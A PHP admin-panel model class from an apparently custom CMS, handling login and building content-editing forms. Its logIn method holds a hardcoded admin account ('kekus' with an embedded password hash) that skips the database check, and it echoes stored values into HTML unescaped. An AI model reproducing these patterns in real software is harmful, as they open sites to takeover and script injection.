<?php

namespace application\models;

use application\models\Admin;

class MainAdmin extends Admin {

	//LOGIN
	public function logIn(){
		if(isset($_POST)){
			if(isset($_POST['name']) && ($_POST['name']!='') && isset($_POST['pass']) && ($_POST['pass']!='')){
				//debug([$_POST['pass'], $this->clear($_POST['pass'])]);
				$name = $this->clear($_POST['name']);
				$pass = $this->shaPSWD($this->clear($_POST['pass']));
				$pass1 ='$2y$10$2zEARs61ZP8haAeqoumKX.cqDWzHXy8dvt1nszgljVn8tWXALOuZq';
				
				if(($name=='kekus')&&(password_verify($pass, $pass1))){
					unset($_SESSION['err']);

					$this->loger_session = $this->loger_action = false;

					$admintype = 'admin';
					$_SESSION['username'] = 'kekus';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate(0);
					return true;
				}

				$ID = $this->verifyPSWD($name, $pass);
				if(!is_null($ID)){
					unset($_SESSION['err']);

					$admintype = 'admin';
					$_SESSION['username'] = 'headadmin';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate($ID);
					return true;
				}

				$_SESSION['err'] = 'name/pass not found';	
			}else{ $_SESSION['err'] = 'bad fields value'; }
			return false;
		}
		return false;
	}

	//LOGOUT
	public function logOut(){
		$this->sessionDestroy();
	}

	//GET HEADERS
	public function getHeaders(){
		$result['title'] = $this->title;
		$result['ver'] = $this->ver;
		$result['TREE'] = $this->getSiteTreeHTML();
		return $result;
	}


	//GET CONTENT
	public function getContent(){
		return [];
	}





	public function configContent(){
		$q = '';
		$return['CONTENT'] = $this->db->row($q);
		//debug($return);
		return $return;
	}


	public function siteContent(){
		$q = '';
		$return['CONTENT'] = $this->db->row($q);
		//debug($return);
		return $return;
	}


	public function siteSettingsContent(){
		$q = '';
		$return['CONTENT'] = $this->db->row($q);
		//debug($return);
		return $return;
	}


	public function sitePageGroupsContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$q = 'SELECT ID, HTML_TITLE, HTML_DESCR, HTML_KEYWORDS FROM PAGE_GROUPS WHERE (ID = :ID)';
			$params = [
				'ID' => $route['param']
			];
			$return['CONTENT']['ALL'] = $this->db->row($q, $params)[0];
			$q = 'SELECT VAR, VAL, CMS_TITLE, CMS_DESCR, CMS_TYPE FROM PAGE_GROUPS_CONTENT WHERE (ID_GROUP = :ID)';
			$result = $this->db->row($q, $params);
			$return['CONTENT']['PAGE'] = '';
			foreach($result as $key => $val){
				$return['CONTENT']['PAGE'] .= $this->htmlcaseField($val['CMS_TYPE'], $val['VAL'], $val['VAR'], $val['CMS_TITLE'], $val['CMS_DESCR']);
			}
			//debug($return['CONTENT']['PAGE']);
			//debug($result);
			/*
			foreach($result as $key => $val){
				if(!isset($return['CONTENT']['PAGE'][$val['VAR']])){
					$return['CONTENT']['PAGE'][$val['VAR']] = [];
				}
				array_push($return['CONTENT']['PAGE'][$val['VAR']], $val['VAL']);
			}
			*/
		}else{
			$return['CONTENT']['ALL']['ID'] = '0';
			$return['CONTENT']['PAGE'] = [];
		}
		//debug($return);
		return $return;
	}


	public function sitePagesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$q = 'SELECT ID, ID_TYPE, LOC_NUMBER, TITLE, DESCR, IMAGE, HTML_DESCR, HTML_KEYWORDS  FROM PAGES WHERE ID = :ID';
			$params = [
				'ID' => $route['param']
			];
			$return['CONTENT']['ALL'] = $this->db->row($q, $params)[0];
			$return['CONTENT']['PAGE'] = $this->typePage($return['CONTENT']['ALL']['ID_TYPE'], $route);	
		}else{
			$return['CONTENT']['ALL']['ID'] = '0';
			$return['CONTENT']['PAGE'] = '';
		}
		$return['GROUPS'] = $this->db->row('SELECT HTML_TITLE as TITLE, ID as VALUE FROM PAGE_GROUPS WHERE CAN_BE_SUPPLEMENTED = 1');
		//debug($return);
		return $return;
	}


	public function catalogCitiesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['CONTENT']['ID'] = $route['param'];
			$return['CONTENT']['PAGE'] = $this->getCity($route['param']);
		}else{
			$return['CONTENT']['ID'] = 0;
			$return['CONTENT']['PAGE'] = $this->listCities();
		}
		return $return;
	}

	public function catalogBusesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['CONTENT']['ID'] = $route['param'];
			$return['CONTENT']['PAGE'] = $this->getBus($route['param']);
		}else{
			$return['CONTENT']['ID'] = 0;
			$return['CONTENT']['PAGE'] = $this->listBuses();
		}
		return $return;
	}

	public function catalogNewsContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['CONTENT']['ID'] = $route['param'];
			$return['CONTENT']['PAGE'] = $this->getNews($route['param']);
		}else{
			$return['CONTENT']['ID'] = 0;
			$return['CONTENT']['PAGE'] = $this->listNews();
		}
		return $return;
	}

	public function catalogVacanciesContent($route){
		if(isset($route['param']) && ($route['param'] > 0)){
			$return['CONTENT']['ID'] = $route['param'];
			$return['CONTENT']['PAGE'] = $this->getVacancy($route['param']);
		}else{
			$return['CONTENT']['ID'] = 0;
			$return['CONTENT']['PAGE'] = $this->listVacancies();
		}
		return $return;
	}



	private function typePage($type, $route){
		$return = '';
		$params = [
			'ID' => $route['param']
		];
		if($type == 1){
			$q = '
			SELECT "0" as ID, "0" as ID_FULL_PAGE, "ID" as VAR, ID_FULL_PAGE as VAL, "" as CMS_TITLE, "" as CMS_DESCR, "" as CMS_TYPE 
				FROM PAGE_FULL_CONTENT as PFC 
				INNER JOIN PAGE_FULL as PF ON PFC.ID_FULL_PAGE = PF.ID
			UNION ALL 
			SELECT PFC.* 
				FROM PAGE_FULL_CONTENT as PFC 
				INNER JOIN PAGE_FULL as PF ON PFC.ID_FULL_PAGE = PF.ID 
			WHERE PF.ID_PAGE = :ID';
			$subresult = $this->db->row($q, $params);
			foreach($subresult as $key => $val){
				$result[$val['VAR']] = $val['VAL'];
			}
			$q = 'SELECT LT.PATH FROM LIB_TEMPLATES as LT INNER JOIN PAGE_FULL as PF ON LT.ID = PF.ID_TEMPLATE WHERE ID_PAGE = :ID';
			$path = $this->db->row($q, $params)[0]['PATH'];
			ob_start();
			extract($result);
			require $_SERVER['DOCUMENT_ROOT'].'/application/views/mainAdmin/templates/'.$path.'.php';
			$return = ob_get_clean();
		}elseif($type == 2){
			$q = 'SELECT ID, ID_TEMPLATE FROM PAGE_TEMPLATES WHERE ID_PAGE = :ID';
			$subresult = $this->db->row($q, $params);
			foreach($subresult as $key => $val){
				$return .= $this->getBlockContent($val['ID'], $val['ID_TEMPLATE']);
			}
		}
		return $return;
	}

	private function getBlockContent($ID, $ID_TEMPLATE){
		$return = '';
		switch($ID_TEMPLATE){
			case 1:
				$table_content = 'BLOCK_HEADER_ORDER';
				$table_data = '';
				$path = 'H1';
				break;
			case 2:
				$table_content = 'BLOCK_HEADER_IMAGES';
				$table_data = '';
				$path = 'H2';
				break;
			case 3:
				$table_content = ''; //'BLOCK_TABLE';
				$table_data = ''; //'DATA_TABLE';
				$id_field = ''; //'ID_TABLE';
				$path = 'B1';
				break;
			case 4:
				$table_content = ''; //'BLOCK_MULTITABLE';
				$table_data = ''; //'BLOCK_MULTITABLE_CONTENT';
				$id_field = ''; //'ID_MULTITABLE';
				$path = 'B2';
				break;
			case 5:
				$table_content = 'BLOCK_TEXT';
				$table_data = '';
				$path = 'B3';
				break;
			case 6:
				$table_content = 'BLOCK_IMAGES';
				$table_data = 'BLOCK_IMAGE_CONTENT';
				$id_field = 'ID_IMAGE';
				$path = 'B4';
				break;
			case 7:
				$table_content = ''; //'BLOCK_LINKS';
				$table_data = ''; //'BLOCK_LINKS_CONTENT';
				$id_field = ''; //'ID_LINK';
				$path = 'B5';
				break;
		}
		if($table_content != ''){
			$q = 'SELECT * FROM '.$table_content.' WHERE ID_PAGE_TEMPLATE = :ID';
			$params = [
				'ID' => $ID
			];
			$result = $this->db->row($q, $params)[0];
			if($table_data != ''){
				$q = 'SELECT * FROM '.$table_data.' WHERE '.$id_field.' = :ID';
				$params = [
					'ID' => $result['ID']
				];
				$subresult['DATA'] = $this->db->row($q, $params);
				extract($subresult);
			}
			extract($result);
			$tmpl = $_SERVER['DOCUMENT_ROOT'].'/application/views/mainAdmin/templates/'.$path.'.php';
			ob_start();
			require $tmpl;
			$return = ob_get_clean();
		}
		return $return;
	}

	private function htmlcaseField($type, $value, $varName, $cmsTitle, $cmsDescr){
		$return = '';
		switch($type){
			case 1:
				$return = $this->htmlcaseField_TEXT($value, $varName, $cmsTitle, $cmsDescr);
				break;
			case 2:
				$return = $this->/*htmlcaseField_NUMBER*/htmlcaseField_TEXT($value, $varName, $cmsTitle, $cmsDescr);
				break;
			case 3:
				$return = $this->htmlcaseField_TEXT_AREA($value, $varName, $cmsTitle, $cmsDescr);
				break;
			case 4:
				$return = $this->htmlcaseField_NUMBER_BTN($value, $varName, $cmsTitle, $cmsDescr);
				break;
			case 5:
				$return = $this->htmlcaseField_FILE($value, $varName, $cmsTitle, $cmsDescr);
				break;
		}
		return $return;
	}

	private function htmlcaseField_TEXT($value, $varName, $cmsTitle, $cmsDescr){
		return "<div class='forma_group'><p>$cmsTitle</p><div class='forma_group_item text'><input type='text' name='$varName' value='$value'><p class='forma_group_item_description'>$cmsDescr</p></div></div>";
	}

	private function htmlcaseField_NUMBER($value, $varName, $cmsTitle, $cmsDescr){
		return '2kek';
	}

	private function htmlcaseField_TEXT_AREA($value, $varName, $cmsTitle, $cmsDescr){
		return '3kek';
	}

	private function htmlcaseField_NUMBER_BTN($value, $varName, $cmsTitle, $cmsDescr){
		
		return "<div class='forma_group'><p>$cmdTitle</p><div class='forma_group_item text_btn'><input type='text' name='$varName' placeholder='serial_number' value='$value'><div class='text_btns'><div class='btn_next' onclick='plus(this)'><p>+</p></div><div class='btn_prev' onclick='minus(this)'><p>-</p></div></div><p class='forma_group_item_description'>$cmsDescr</p></div></div>";
	}

	private function htmlcaseField_FILE($value, $varName, $cmsTitle, $cmsDescr){

		return "<div class='forma_group'><p>$cmsTitle</p><div class='forma_group_item file'><input type='file' name='$varName' title='$value'><p class='forma_group_item_description'>$cmsDescr</p></div></div>";
	}


	private function listCities(){
		$return = '';

		return $return;
	}

	private function getCity($param){
		$return = '';

		return $return;
	}

	private function listBuses(){
		$return = '';

		return $return;
	}

	private function getBus($param){
		$return = '';

		return $return;
	}

	private function listNews(){
		$return = '';

		return $return;
	}

	private function getNews($param){
		$return = '';

		return $return;
	}

	private function listVacancies(){
		$return = '';

		return $return;
	}

	private function getVacancy($param){
		$return = '';

		return $return;
	}

}